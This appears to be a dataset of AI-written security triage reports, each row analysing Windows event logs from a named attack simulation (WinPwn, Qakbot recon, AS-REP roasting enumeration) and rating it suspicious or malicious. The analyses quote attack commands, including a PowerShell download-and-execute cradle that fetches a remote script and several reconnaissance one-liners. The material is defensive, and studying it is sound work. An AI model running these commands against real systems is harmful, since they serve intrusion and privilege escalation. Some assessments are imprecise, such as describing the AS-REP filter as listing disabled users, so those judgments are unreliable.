1. **Event ID 4672** - Privileges Assigned to a New Logon:
   - The user `admin_test` has been assigned a range of high-level privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeImpersonatePrivilege`, among others. 
   - The assignment of these privileges is notable because `SeDebugPrivilege` allows a user to debug any process, which could potentially be used for malicious purposes.

2. **Event ID 4624 & 4634** - Logon and Logoff Events:
   - Logon Type 3 indicates a network logon, which is typical for accessing shared resources.
   - The `admin_test` account's network logon and the immediate logoff without much other associated activity can be considered unusual if it's isolated.

3. **Event ID 4799** - Membership Enumeration:
   - Powershell command `Get-LocalGroupMember -Name ""Administrators""` indicates potential reconnaissance activity.
   - This is reflected in several event records where the command `powershell.exe & {get-localgroup, Get-LocalGroupMember -Name ""Administrators""}` seems focused on enumerating admin group members, which is indicative of privilege escalation attempts or reconnaissance.

### Sysmon Log Analysis:

1. **Frequent Execution of wevtutil.exe & conhost.exe**:
   - The `wevtutil.exe` utility is mainly used for managing event logs and might have been used here for log clearing, which is suspicious after potential recon activity.
   - The frequent appearance of `wevtutil.exe` could indicate attempts to manage or abuse event logs, potentially to remove traces of actions.

2. **Process Execution Observables**:
   - Commands such as `HOSTNAME.EXE`, `whoami.exe` reflect typical environment discovery actions.
   - These actions alone are not harmful, but combined with `wevtutil.exe` and the user privileges mentioned, they could potentially indicate malicious intent.

### Application and System Log Analysis:

- **Edge Update Activity**: 
  - Consistent updates, installations, and service stops of Microsoft Edge Update components are typical background activities and can be regarded as benign.
  
### PowerShell Log Analysis:

- **PowerShell Execution Context**:
  - PowerShell logs reinforce the suspicion that there was an active reconnaissance via PowerShell scripts (explicit calling for `Get-LocalGroupMember -Name ""Administrators""`).

### Conclusion:

There are several indicators of possible malicious activity:
- The assignment of extensive privileges to the `admin_test` user can be considered suspicious, especially with the presence of `SeDebugPrivilege`.
- The PowerShell command aimed at gathering admin group information.
- The repetitive execution of `wevtutil.exe` suggests possible log tampering.

### Resolution:

**SUSPICIOUS**

The activity warrants further investigation due to potential reconnaissance and privilege escalation attempts. It doesn't reach a level of confirmed compromise because there are no direct indicators of data exfiltration or system manipulation yet. However, the patterns suggest gathering information for further potential exploitation.

### Guidance:

1. **Immediate Actions**:
   - Audit actions by the `admin_test` account.
   - Implement enhanced monitoring on systems using EDR to capture further actions.
   - Check for unusual account creation or privilege escalation events.

2. **Long-term Recommendations**:
   - Review all privileged accounts and their activity logs.
   - Conduct a system-wide audit for anomalies or potential indicators of compromise.
   - Reinforce PowerShell logging and deploy mechanisms for activity anomaly detection."
Remote System Discovery - arp,"Upon analyzing the provided Windows event logs, several observations can be made regarding the potential for malicious activity. Here's a detailed analysis of the logs:

### Key Observations:

1. **Process Execution:**
   - Multiple executions of standard Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `arp.exe`, and `wsmprovhost.exe`.
   - Execution of `cmd.exe` with the command `/c arp -a` may indicate network reconnaissance activity, which can be suspicious if not expected from the user's regular activities.
   - Common administration tools like `wevtutil.exe` and `wsmprovhost.exe` are executed by the user `admin_test`, which could be normal but could also indicate potential misuse of administrative privileges.

2. **Privilege Use:**
   - The presence of event 4672 indicates special privileges assigned to the user `admin_test`, which includes `SeDebugPrivilege`, `SeBackupPrivilege`, and more, suggesting the user has elevated rights.
   - Use of privileges such as `SeDebugPrivilege` can be indicative of nefarious activity, especially if unexpected from a standard user account.

3. **Time Manipulation:**
   - Kernel-General events (IDs 1, 24) and Security-Auditing events (ID 4616) suggest a potential modification of the system time, which might be an attempt to manipulate timestamps for logs or file creation. This kind of manipulation is often used to cover tracks during malicious activities.

4. **Frequent Logons and Process Executions:**
   - Numerous process executions initiated by the user `admin_test`, as shown in Event IDs 5 (for multiple processes), indicates possible automated scripting activity.

5. **Antivirus and Updates:**
   - Various processes related to updating Microsoft Edge and Microsoft Defender Antivirus were running. The presence of such activities suggests routine updates, which are usually benign but should be verified to ensure they weren't used as a vector for malicious payloads.

### Assessment:

- **Suspicious Activity:**
  - The combination of network reconnaissance commands (`arp -a`), time manipulation events, and the potential misuse of administrative privileges warrants further investigation.
  - The existence of `cmd.exe` being used for a network-related command, especially in the context of a CEO's machine, can indicate a potential unwanted intrusion or internal reconnaissance activity.

### Resolution: SUSPICIOUS

Given the observations, while there is no definitive evidence of malicious activity, the behaviors logged do not entirely align with routine administrative tasks and could suggest a deeper issue such as unauthorized access or internal reconnaissance. Therefore, further investigation is necessary to determine the intent and source of these actions.

### Guidance on How to Proceed:

1. **User Verification:**
   - Confirm with the user `admin_test` and the IT department if the observed activities were legitimate and part of expected administrative tasks.

2. **Network Activity Monitoring:**
   - Monitor network activities for any unusual traffic originating from or directed to the CEO's machine.

3. **Review Permissions:**
   - Verify and audit the permissions and accesses granted to `admin_test` to ensure that they are in line with organizational policies.

4. **Check for Retained Reconnaissance Scripts:**
   - Investigate temporary directories and user directories (`C:\Users\admin_test\Documents` and `C:\Users\ADMIN_~1\AppData\Local\Temp`) for any scripts or batch files that could automate such reconnaissance activity.

5. **System Time Logs:**
   - Correlate system time events with any critical system or security events to identify if the time manipulation coincides with other suspicious activities.

6. **Security Tools Update Verification:**
   - Ensure antivirus and Microsoft Edge updates were completed successfully and verify their sources to ensure they align with known good versions.

Further investigation and correlation with additional data sources would help solidify the understanding of this activity and determine if any mitigation actions are necessary."
Security Software Discovery - powershell,"### Analysis:

#### Suspicious or Anomalous Behavior:

1. **PowerShell Execution:**
   - The logs indicate the execution of a PowerShell command that looks for processes with descriptions containing terms like ""virus,"" ""carbonblack,"" ""defender,"" ""cylance,"" ""mc,"" and checks for the presence of ""Sysmon."" These indicate a potential reconnaissance or evasion attempt to identify security tools and malware-related processes running on the machine.
   - The command structure suggests the use of PowerShell to gather process information, potentially with the intent to disable or bypass security mechanisms.

2. **System Time Anomalies:**
   - The system logs and security logs show discrepancies in the system timestamp, which is adjusted backwards. Such behavior can be indicative of attempts to tamper with log files to cover tracks or confuse logging and alerting systems.

3. **Sysmon Activity:**
   - Multiple Sysmon logs indicate several processes, including PowerShell, `whoami.exe`, and `wevtutil.exe` running under a high integrity level by the user `SERVER002\\admin_test`. 
   - The presence of `whoami.exe` could be an attempt by a user to identify the current logged-in context, hinting towards reconnaissance activities.
   
4. **Edge Update Processes:**
   - A series of Edge update processes are seen executing. While these might be legitimate, the repetitive and extensive nature of these executions within a short period could raise suspicion about their legitimacy, especially considering potential process injection or malware impersonation tactics.

#### Potential Indicators of Malicious Activity:

- **PowerShell execution patterns** directed towards identifying security tools suggest the possibility of a malicious actor attempting to gain information to disable security defenses.
  
- The **system time adjustment** highlights potential log manipulation, which is a known tactic for concealing malicious activity.

- **Multiple `whoami` executions** in particular may not be inherently malicious but can be combined with other indicators as part of a larger reconnaissance phase in an attack.

### Assessment:

Based on the observed PowerShell commands targeting security-related processes and the manipulation of system time, these logs show multiple indicators that are aligned with malicious intent. 

### Resolution: **MALICIOUS**

### Guidance:

1. **Immediate Containment:** Isolate the affected machine to prevent any lateral movement or data exfiltration.
2. **Forensic Analysis:** Conduct a deeper forensic analysis on the isolated machine to identify the entry point, tools used, and any potential persistence mechanisms.
3. **Review Security Processes:** Ensure all security tools are operational and look for any signs of tampering. Check for any security policy deviations.
4. **Patch and Update:** Ensure all systems are up-to-date with the latest security patches.
5. **User Education:** Educate users, especially high-profile users like the CEO, on the importance of security awareness to prevent phishing or social engineering attacks that might facilitate such attempts. 
6. **Network Monitoring:** Increase monitoring of network traffic for signs of anomalous behavior, particularly around times matching the logs analyzed here."
List Google Chrome - Edge Chromium Bookmarks on Windows with command prompt,"Upon reviewing the provided Sysmon, Application, System, Security, and Windows PowerShell logs, here is a detailed analysis of the events:

1. **Use of Built-in Windows Tools:** 
   - The tool `whoami.exe` was executed multiple times, which is typically used to display logged-on user information. This was executed from a high integrity context by `SERVER002\admin_test`.
   - The `hostname.exe` and `cmd.exe` utilities were executed. The command executed via cmd was `where /R C:\Users\ Bookmarks`, which searches recursively for a file or directory named ""Bookmarks"". While `where.exe` is a legitimate utility, its usage here reflects potential data reconnaissance indicative of an actor preparing for lateral movement or data exfiltration.
   - `wevtutil.exe`, another legitimate utility, was executed multiple times, which can indicate log manipulation.

2. **Process Execution Context and Privileges:**
   - A majority of these processes exhibit a high integrity level, which indicates execution with elevated privileges.
   - Several processes run by the `NT AUTHORITY\SYSTEM` account indicate typical system-level operations, especially concerning Windows Update and Defender Update operations logged in both System and Application logs. 

3. **Windows Defender and Updates:**
   - The logs show processes related to Microsoft Edge updates and a Defender Antivirus update. These operations are typical and expected for maintaining system security and integrity.

4. **Potential Suspicious Commands:**
   - The command executed from `cmd.exe` targeting a search for 'Bookmarks' recursively might be linked to an effort to gather specific information, which can be suspicious if executed without purpose.
   - Repeated `wevtutil.exe` executions suggest potential attempts to alter or read event logs, which can be a tactic to cover tracks after malicious operations.

5. **Time Synchronization:**
   - The security logs include timezone and time synchronization-related events, which on their own do not typically indicate malicious activity but should be noted if there are suspect changes in system time outside of regular updates.

6. **Summary of Legitimate Activity:**
   - A lot of processes executed by `NT AUTHORITY\SYSTEM` and common system processes (like `MicrosoftEdgeUpdate.exe`, `taskhostw.exe`, `wermgr.exe`, `svchost.exe`, `wuauclt.exe`) seem part of routine system maintenance and are benign by themselves.
   - Windows System and Application logs also correspond to expected behavior of updates and maintenance.

**Assessment:**
- The logs reveal a mix of legitimate system activities primarily linked to updates and routine operations. However, the usage pattern and execution contexts of `cmd.exe` along with specific searches (potentially for sensitive information like bookmarks) indicate a possible reconnaissance activity.
- Multiple high-integrity processes, particularly those executed from within user directories and with elevated privileges, could indicate either benign administrative tasks or preliminary stages of unauthorized data collection or an attack.

**Resolution:**
- **SUSPICIOUS:** The presence of potential reconnaissance commands and the use of high-integrity built-in tools—though not outright malicious—warrants further investigation to ensure no unauthorized actions were taken. Recommend verifying these activities with the user and conducting a security review for any recent changes or suspicious accesses. Consider further monitoring for any additional indicators of potential compromise and checking for any unauthorized changes in file integrity or user access patterns."
Basic Permission Groups Discovery Windows (Local),"The event logs provided reveal multiple instances of potential security concerns which need to be addressed.

1. **Usage of System Utilities**:
   - The `whoami.exe` and `cmd.exe` utilities were executed by the user `SERVER002\admin_test`, which are often legitimate but can also be used maliciously for privilege information gathering (whoami) and script execution (cmd) without obvious malicious code.
   - The `cmd.exe` is involved with a command-line parameter attempting to enumerate local group and administrators, which might be related to privilege enumeration or escalation attempts, often associated with malicious activity: `""cmd.exe"" /c net localgroup & net localgroup \""Administrators\""`.

2. **Execution of Edge Update Process**:
   - The logs contain numerous entries relating to the execution of the `MicrosoftEdgeUpdate.exe` and its related setup processes. Although these entries appear to be legitimate update operations for Microsoft Edge, the sheer volume and frequency, especially with `System` level privileges (i.e., `NT AUTHORITY\SYSTEM`), raise concerns about whether these processes are genuine updates or being exploited.
   - We also note that a few of the `MicrosoftEdgeUpdate.exe` logs involve temporary directories, which could warrant further inspection to ensure these are not maliciously created.

3. **Atypical Time Modifications**:
   - There are two event logs (EventID: 4616) showing small time changes performed by `svchost.exe`, acting within a `LOCAL SERVICE` context, which is common but can indicate tampering if performed frequently or extensively outside maintenance windows.

4. **Security Audit IDs**:
   - EventID 4799 indicates a modification attempt to the Administrators group by the `admin_test` user using `net1.exe`.
   - The combination of system utilities execution (`whoami.exe`, `net.exe`, etc.) along with these attempts can suggest attempts at unauthorized access or privilege escalation.

**Assessment**:
The actions captured in the Sysmon and Security logs (usage of system utilities, group enumeration commands, Edge update processes, and time modifications) cumulatively indicate a possible intrusion or malicious intention. The whoami, cmd, and net command activity, specifically coupled with privilege changes and frequent service executions, point to at least some actions being suspicious, potentially probing or setup phases of an attack.

**Resolution**: **SUSPICIOUS**

**Guidance**:
1. Conduct a more thorough investigation, focusing on tracing back the session of `SERVER002\admin_test` to the source of initiation.
2. Investigate whether the Edge update executions are legitimate by correlating with planned patching activities or known update schedules.
3. Review user and process access management to ensure least privilege principles are adhered to, especially for high-privilege accounts.
4. Implement tighter monitoring and alerting on privilege use and administrative command executions through your SIEM or EDR tools."
WinPwn - Powersploits privesc checks,"After analyzing the provided Windows event logs, I have identified the following key observations and assessments:

### Suspicious and Anomalous Behaviors:
1. **PowerShell Execution:** The logs show multiple PowerShell event IDs with a suspicious command execution:
   - The command uses `iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')`.
   - This is indicative of PowerShell being used to download and execute a script from a potentially malicious URL.

2. **High-Integrity Level Execution:** The PowerShell script was executed with high integrity, which is unusual for standard user operations, indicating potential privilege escalation or malicious intent.

3. **Sysmon Events:** The logs indicate several processes initiated around the same time as the PowerShell activity:
   - The process `powershell.exe` was spawned executing the aforementioned command.
   - Various processes managed by `admin_test`, including `wevtutil.exe` and `conhost.exe`, show high integrity levels and are often associated with administrative operations.

### Indicators of Malicious Activity:
- **Usage of `iex` with `DownloadString`:** This is a common method used by attackers to execute malicious scripts directly from the internet without writing anything to the disk, making detection more difficult.
  
- **Remote Script Execution:** The script is being downloaded from a public and untrusted source (`raw.githubusercontent.com`), which is unusual for enterprise-controlled environments.

### Assessment:
- The activities related to PowerShell execution are highly suspicious. The use of `iex` for script execution from an external source is a strong indicator of potential malicious activity. The scripts could potentially compromise the system by downloading and executing harmful code.

### Resolution:
- **MALICIOUS:** The logs provide sufficient evidence to conclude malicious activity due to the execution of an untrusted PowerShell script with elevated privileges.

### Recommendations:
1. Immediately perform a thorough review of any other systems connected to the network for similar activities.
2. Check for any unauthorized modifications or new user accounts created around the timeframe of the suspicious activities.
3. Block access to the suspicious URL and similar domains to prevent further exploitation.
4. Conduct a thorough investigation of `admin_test` activities that might indicate insider threats or compromised credentials.
5. Consider isolating the affected system (Server002) to prevent any potential spread and conduct a detailed forensic analysis."
WinPwn - itm4nprivesc,"Upon analyzing the provided Windows event logs, the following observations and assessments have been made:

1. **System Time Changes**: 
   - The system logs indicate multiple time change events initiated by `svchost.exe`, a legitimate Windows process. These changes were reflected in both the System and Security logs, documented by Event ID 4616 in the Security log.
   - While frequent time changes can be suspicious, in this context, the same process ID indicates it might be part of a routine update or time synchronization process managed by Windows Time Service (as seen with Event ID 35).

2. **Processes and Command Executions**: 
   - The Sysmon logs show several benign process executions, such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`, which are standard Windows utilities.
   - However, the presence of a PowerShell execution with a script download command raises a significant concern. The Sysmon logs capture the execution of `powershell.exe` with a command line indicating an attempt to download and execute a script from a URL on GitHub: `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')}`.

3. **PowerShell Activity**:
   - Multiple PowerShell events in the Windows PowerShell log show that a potentially malicious script was executed. The command involves downloading and executing a script from an external source using `Invoke-Expression`, which is often used in malicious scenarios for executing arbitrary code.
   - The command line includes `itm4nprivesc -noninteractive -consoleoutput`, suggesting the downloaded script could be attempting privilege escalation.

4. **Conclusion**:
   - The PowerShell activity is highly suspicious as it involves downloading and executing a script from the internet without any apparent authorization or documented process. This action, combined with the nature of the command, strongly indicates a potential compromise attempt.

**Resolution**: MALICIOUS

**Guidance**:
- Immediate action is required to contain and remediate potential security threats.
- Isolate the system from the network to prevent further malicious activity or data exfiltration.
- Perform a thorough investigation to identify other systems that might have been affected.
- Analyze the downloaded script (if accessible) to understand its impact and potential payload.
- Reset credentials and review user permissions to mitigate privilege escalation risks.
- Implement strict PowerShell execution policies and network controls to prevent unauthorized script execution in the future."
Qakbot Recon,"### Analysis of Provided Windows Event Logs

#### Overview

The logs provided show a series of activities within a Windows system, specifically on a computer named ""Server002"" within a WORKGROUP environment, with access events related to a user named ""admin_test"" and a number of Microsoft system and application processes. A series of events are notable for further examination, particularly those indicating potential suspicious behavior related to privilege escalations and process executions.

#### Key Points of Analysis

1. **Failed Credential Access**:
   - Multiple EventID 5379 entries indicate attempts to access credential information using `MicrosoftAccount` and `WindowsLive` targets. These attempts all failed with a return code of 3221226021 (STATUS_LOGON_FAILURE), which is typical during unsuccessful credential accesses. Such failures might potentially indicate a probing attempt or an error in service configuration.

2. **Privilege Escalation**:
   - EventID 4672 shows a user ""admin_test"" receiving significant privileges, including `SeSecurityPrivilege`, `SeBackupPrivilege`, and `SeDebugPrivilege`. This is notable because the occurrence of receiving high-level privileges without clear operational need often indicates suspicious administrator actions or privilege escalation.

3. **Suspicious Logon Sessions**:
   - EventID 4624 logs reveal a Logon Type 3 session for the user ""admin_test"" from the workstation ""DESKTOP-3HL5B2P,"" with NTLM as the authentication method. Logon Type 3 suggests network logon, possibly indicating remote access which might not be usual for a senior executive's system unless specifically part of the work usage policy.

4. **Unusual Sysmon Process Activity**:
   - Sysmon EventID 1 and 5 logs show numerous command-line utilities being executed (`whoami.exe`, `net.exe`, `arp.exe`, etc.), often used for gathering information about the system environment. Multiple executions suggest the possible execution of scripted system reconnaissance activities likely intended for information gathering.
   - Specifically, the execution of scripts in temporary directories (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\script.bat`) is suspicious, particularly since running scripts from Temp directories is a common technique used by malicious actors during exploitation.

5. **Regular Software Updates**:
   - The system logs show regular updates via Windows Update and Defender Antimalware updates, which in isolation are generally benign, but the focus should remain on the timing and correlation with the above activities.

#### Assessment and Resolution

- **BENIGN**: Regular Windows Defender and System updates are observed, showing typical maintenance processes.
  
- **SUSPICIOUS**: The logs contain several suspicious indicators needing further investigation. There is an influx of privilege escalations and network authentication activity by the user ""admin_test"". Reconnaissance commands executed within a short timescale and from temporary directories elevate suspicion, possibly indicating preparative activities for malicious intent. Furthermore, the logs display systemic access attempts with repeated failures to access system credentials.

- **MALICIOUS**: No explicit evidence of a definitive malicious action (like the execution of known malware) visible in the logs.

Given the evidence provided and the system's environment, the situation is assessed as **SUSPICIOUS**. This warrants further investigation, focusing on:
- Confirming the legitimacy of the `admin_test` user activity.
- Evaluating network access policies related to remote logon events.
- Analyzing the contents and contexts of the referenced script executions and command-line processes.
- Conducting a thorough anomaly and intrusion detection scan on Server002 for further signs of compromise or exploitation attempts.

This assessment should be pursued with continued monitoring, validating configurations, and potential isolation of suspicious accounts or suspect processes if necessary."
Automated AD Recon (ADRecon),"To determine an appropriate resolution for the events listed from the Windows event logs, let's conduct a detailed analysis:

### Log Analysis:

1. **Security Log:**
   - **Event ID 4624 & 4672**: These are related to successful logons and special privileges assigned, respectively. The SYSTEM account acquiring a wide range of privileges is typical in system processes. The elevated tokens align with system processes.
   - **Event ID 5379**: These events pertain to failures in accessing Microsoft accounts or services and return a consistent error code (3221226021). While persistent, these events can suggest failed connections, potentially due to incorrect configuration but don't inherently indicate malicious activity.
   - **Event ID 4798**: Events showing enumeration of local user names. Frequently associated with legitimate processes like taskhostw.exe. If seen in conjunction with unknown services or external probes, it could indicate reconnaissance.
   
2. **Application Log:**
   - Various application logs, including from SecurityCenter and SPP, denote typical system and security checks, like Windows Defender being active. No concerning activity is noted here.

3. **PowerShell Log:**
   - Events indicate the execution of a PowerShell script (`script.ps1`) from a temporary directory. The use of `Invoke-Expression` in PowerShell can be suspicious if the script is not recognized as part of routine administrative tasks or software.
   
4. **Sysmon Log:**
   - Indicates multiple process creations and executions, notably borderline suspicious when `powershell.exe` is executed directly with external scripts from user writable paths. Additionally, the use of tools like `whoami` from non-administrative users could be flagged if repeated or paired with other suspicious behaviors.
   - **wevtutil.exe**: A utility that interacts with the Windows Event Log. Multiple executions by `admin_test` could suggest log tampering attempts if the context is irregular.
   - Files and processes related to Microsoft Edge seem aligned with typical update processes unless these processes are unauthorized or unexpected.

### Assessment:

- **Powershell Execution**: The use of a temporary directory for executing scripts inherent in `Invoke-Expression` is somewhat concerning, again depending on the full context of administrative use.
  
- **User Enumeration (4798)**: `taskhostw.exe` is legitimate, but if this appears without correlation to known task invocations, it could be potentially intrusive.

- **Failed Microsoft Account Operations (5379)**: Unless directly paired with known credentials and operational timings from external entities, these are benign failures likely due to misconfigurations.

### Conclusion:

- **Resolution: SUSPICIOUS**:
    - While none of the specific logs give definitive proof of compromise, the combination of PowerShell script execution from a temporary location, user enumeration, and an unknown context of `wevtutil.exe` usage suggests these activities warrant further investigation to ensure these were intended and authorized actions or if they align with known system behaviors and schedules.
    - **Next Steps**: Recommend investigating the exact purpose and origin of all temporary scripts, reviewing user logs correlating times with known administrative tasks, and confirming if any credential management changes might have influenced account operation failures. Secure and, if necessary, change Microsoft Account credentials to prevent unintended exposure."
WinPwn - winPEAS,"### Detailed Analysis:

#### Windows PowerShell Logs

- **Suspicious PowerShell Activity:**
  - There is a recurring PowerShell execution pattern that uses `iex(new-object net.webclient).downloadstring(...)` to download and execute a script from a GitHub URL. This is a known tactic that can be leveraged for malicious purposes, such as downloading and running malicious scripts from the internet.
  - The command is attempting to run `winPEAS`, a well-known script used for privilege escalation audits and uncovering potential system weaknesses. While `winPEAS` itself is not inherently malicious, its execution in a corporate environment, especially without prior notification or during a critical time, is highly suspicious.
  
#### System Logs

- **System Time Changes:**
  - Multiple time adjustments are logged close to the suspicious PowerShell activities. While this can happen under legitimate scenarios (e.g., time synchronization tasks), it aligning closely to PowerShell download attempts can be part of an attacker’s attempt to bypass security logging by desynchronizing logs.
  
#### Application Logs

- **Routine Application Activities:**
  - Entries related to the normal functioning and updates of Windows Defender and Microsoft Edge. No suspicious anomalies present.

#### Sysmon Logs

- **Notable Process Executions:**
  - Emphasis on PowerShell execution with the same suspicious PowerShell command indicative of external script downloads.
  - Other observed activities are installations and updates related to Microsoft Edge Update. These are normal and typically benign.

#### Security Logs

- **Security Audit:**
  - Local Service was involved in time changes. Time updates by the Local Service are common for legitimate operations but should be reviewed further given the context of the PowerShell activities.

### Assessment

- **Threat Level: SUSPICIOUS**
  - The usage of `iex` to download and run scripts from external sources is a commonly recognized method of executing potentially unverified or harmful code. Even though the `winPEAS` tool itself is not malicious, its execution without explicit permissions in this environment is termed suspicious.
  - Presence of unverified script download using a PowerShell command implies the potential for downloading other malicious payloads.
  - Coordinated system time changes around suspicious activities serve to elevate concern and demand further scrutiny, although not conclusively malicious on their own.

### Guidance

1. **Immediate Actions:**
   - Isolate the host to prevent further potential exfiltration or malicious actions.
   - Conduct a thorough forensic analysis of the downloaded scripts and any subsequent actions taken by these scripts.
   - Investigate how the script was introduced and executed—possible phishing, social engineering, or credential misuse.

2. **Review User Activities:**
   - Check user actions around these logs to find any patterns that could indicate insider threats or compromised user accounts.

3. **Enhance Monitoring:**
   - Implement stricter monitoring and alerts on PowerShell usage that involve internet access for downloads and executions.
   - Use endpoint security solutions to further inspect for potential lateral movement or persistence methods deployed by using downloaded scripts.

4. **Security Awareness and Training:**
   - Reiterate the importance of security hygiene, particularly around executing unverified scripts, to privileged users and administrators within the organization.

Based on the findings, further investigation is needed to determine if the suspicious activity results in an actual compromise. The resolution for this assessment remains **SUSPICIOUS** pending further in-depth analysis."
System Service Discovery - net.exe,"In the provided Windows event logs, we need to determine if there are any indicators of malicious activity by analyzing logs from the Security, Sysmon, and System channels. Below I provide an analysis of the events:

### Suspicious or Anomalous Behavior:

1. **Security Log Events**:
   - **Event ID 4672**: Indicates that the user `admin_test` logged on with special privileges, including `SeSecurityPrivilege`, `SeBackupPrivilege`, and more. This in itself is not unusual for an admin account but does raise suspicion due to its timing and context.
   - **Event ID 4624**: This is a successful logon event. Using NTLM authentication and coming from a device `DESKTOP-3HL5B2P`, it could indicate a remote logon. Privileged accounts logging on remotely with NTLM could potentially be a concern unless commonly expected.
   
2. **Sysmon Logs**:
   - **Process Executions**: Multiple instances of `wevtutil.exe` and `conhost.exe` executed under the `admin_test` account in quick succession. `wevtutil.exe` is a legitimate tool used for managing Windows Event logs but can be used by attackers to clear logs.
   - **Command Execution**: The execution of common Windows binary `net.exe` for listing services followed by `cmd.exe` processes performing redirection (`>> %temp%\\service-list.txt`) indicates a capture of system state, which can be suspicious in the context of unusual activities if unexpected from this user.
   - **Process Integrity Level**: Commands run at a high integrity level, suggesting privileged execution.

3. **System Logs**:
   - Logs indicate a regular update process involving Microsoft Defender Antivirus, which is typical for system maintenance and not inherently suspicious.

### Indicators of Potential Compromise:

- The combination of tool usage (such as `wevtutil.exe`) for event log manipulation, command-line execution to enumerate services (`net.exe`), and the significant privileges held by the user (`admin_test`) resembles behaviors often associated with attack patterns where an adversary attempts to clean traces and gather system information.

### Conclusion:

Based on the logs above, I categorize this as **SUSPICIOUS**. Although there isn't conclusive evidence to declare the activity as explicitly malicious, the use of privileged commands and potential log clearing actions warrants further investigation. Specifically, an analysis into the intentions behind these admin actions should be pursued.

### Recommendations:

1. **Immediate Steps**: 
   - Check with the user `admin_test` or IT administrators for the context around these log activities to see if they align with expected behavior.
   - Review other security data sources (e.g., firewall logs, user behavior analytics) for more correlations.

2. **Forensic Analysis**:
   - Retrieve and analyze copies of any `service-list.txt` files referenced in the `cmd.exe` events for detailed insights into potential unauthorized reconnaissance activities.
   - Consider looking at previous and subsequent logs to gain clearer context about ongoing activities on `SERVER002`.

3. **Preventive Measures**:
   - Ensure logging is configured to alert on potentially harmful activities like misuse of `wevtutil.exe`.
   - Apply strict access controls and multi-factor authentication on accounts with high privileges.

By investigating these leads further, you can ascertain whether this activity was benign or if it points to a security breach."
Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting),"### Analysis of the Logs

1. **Suspicious PowerShell Activity:**
   - There are multiple Sysmon logs indicating the execution of `powershell.exe` by the user `admin_test`. The command executed is `Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name`, which is a command to list disabled Active Directory users. While not inherently malicious, running this command on a CEO's machine without a clear administrative purpose or documentation can be suspicious, particularly by an account named `admin_test` which might not typically have legitimate needs to query user accounts in this manner, especially on a non-domain joined machine.

2. **Unexpected Privilege Assignments:**
   - Security Event ID 4672 indicates that the SYSTEM account on `Server002` was granted privileges typically associated with administrative tasks, such as `SeDebugPrivilege`. While SYSTEM usually has such privileges, monitoring privilege assignments on a critical system like the CEO's machine is prudent to ensure there's no misuse or exploitation.

3. **Unusual Use of Taskhostw.exe:**
   - Numerous events show `taskhostw.exe` querying user account information, which aligns with process execution activity typically linked to some automated administrative task or a scheduled task. Considering that `taskhostw.exe` was executed on `SERVER002`, this could be part of legitimate system tasks, but it requires validation against known task schedules and intentions.

4. **Repeated Credential Access:**
   - Event ID 5379 shows repeated attempts to access Microsoft account credentials, which returned a failure code. This pattern might suggest an automated task attempting to access credential stores, potentially indicative of malicious exploration or a poorly configured legitimate process.

5. **Multiple Edge Update Executions:**
   - Sysmon logs show repeated execution of `MicrosoftEdgeUpdate.exe` processes. Typically, updating processes like these don't spawn so many process chains in a short period unless the update mechanism is faulty or corrupted.

### Assessment

- **Suspicious Activity Detected:**
   - The use of PowerShell by a potentially unauthorized or irregular account (`admin_test`) to query Active Directory-like data on a machine that might not typically interact with AD environments is suspicious.
   - The execution of numerous instances of Windows processes such as `taskhostw.exe` querying user information closely together with attempts to access credentials suggests more investigation is needed to rule out both potential misconfigurations and deliberate tampering.

### Recommendation

1. **Investigate `admin_test`:** Verify the legitimacy and authorization of the `admin_test` account and ensure it aligns with active directory policies. Check if it's a legitimate admin account or a shadow admin scenario.

2. **Review Scheduled Tasks and Running Processes:** Compare the logs to legitimate task schedules on `Server002` to validate if these processes were indeed scheduled by an administrator with known tasks.

3. **Credential Access Monitoring and Audit:** Look into the failures of credential access in Event ID 5379 to understand if this points to configuration problems or potential credential harvesting efforts.

4. **Edge Update Process Examination:** Ensure `MicrosoftEdgeUpdate.exe` is the legitimate Microsoft process and not a lookalike or potentially tampered file. Consider auditing the updates and update sequences to ensure they align with legitimate activity records.

### Resolution
- **Resolution: SUSPICIOUS**
   - The reported activities contain elements warranting further investigation to rule out any potential malicious behavior or compromise. Steps should be taken to confirm the legitimacy of observed tasks, user account interactions, and process executions."
Device Driver Discovery,"**Analysis:**

The provided logs indicate activity on a Windows host, specifically related to process execution, user logins, and other system operations. These logs should be examined carefully to highlight any unusual or suspicious activity indicative of malicious behavior.

1. **Sysmon Logs:**
   - Several instances of process creation involving common Windows utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe`.
   - Many Sysmon Event ID 5 logs, which indicate process termination, showcasing a repetitive pattern of processes like `wevtutil.exe` and `conhost.exe` being executed quickly one after another by the user `SERVER002\admin_test`.
   - A sequence of PowerShell activity is noted, specifically running `driverquery` commands. This is somewhat unusual in bulk for regular activity and might indicate attempts to gather system driver information, which can be a red flag if not typical for the user's normal activity.

2. **Application Logs:**
   - Events related to the Microsoft Edge Update service, indicating an application service stop. Activity surrounding these logs appears benign as they align with typical application update processes.

3. **Security Logs:**
   - There's a log concerning privilege escalation under Event ID 4672, where the user `admin_test` is granted a myriad of privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. This elevation of privileges and multiple logon events in a short timeframe could potentially signal either administrative activity or misuse.
   - Several `4624` and `4672` log entries suggesting multiple log-on and privilege-assigned actions. Logon type ""3"" indicates network logons, which can be legitimate if expected, but should be verified.

4. **System and PowerShell Logs:**
   - Time synchronization events appear, potentially from a known source `time.windows.com`.
   - The PowerShell logs reveal execution of commands `driverquery /v /fo list` and `driverquery /si /fo list`, which aligns with the Sysmon log entries. The PowerShell activity corresponds to system inventory actions that might be legitimate but could also serve as information gathering for malicious intent if unexpected.

**Assessment and Guidance:**

Considering the analysis above, the logs demonstrate a mix of typical system operations (application updates) and some activities that may be considered unusual or require further scrutiny:
- **Elevation of Privileges:** The significant grant of privileges could be part of administrative tasks or potentially malicious actions, especially in conjunction with other suspicious activities.
